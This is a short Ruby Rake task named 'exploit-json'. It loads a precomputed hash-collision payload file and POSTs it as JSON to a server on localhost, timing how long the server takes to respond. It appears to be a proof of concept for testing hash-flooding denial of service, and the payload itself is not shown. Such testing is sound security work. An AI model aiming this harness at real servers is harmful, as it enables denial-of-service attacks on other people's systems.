require 'net/http'
require 'benchmark'

SERVER = URI("http://localhost:3000")
PRNG = Random.new
VALUE = "a"

task "exploit-json", :blocks do |t, args|

  def run_bm(blocks)
    Benchmark.bm do |bm|
      puts "Number of collisions: 2^#{blocks} (=#{2**blocks})"
      params = nil
      bm.report("Create collisions:") do
        params = File.read("payload(#{blocks})")
      end
      bm.report("Server response:") do
        req = Net::HTTP::Post.new("/")
        req.content_type = "application/json"
        req.body = params
        res = Net::HTTP.start(SERVER.hostname, SERVER.port) do |http|
          http.request(req)
        end
      end
    end
  end

  run_bm(args[:blocks].to_i)
end

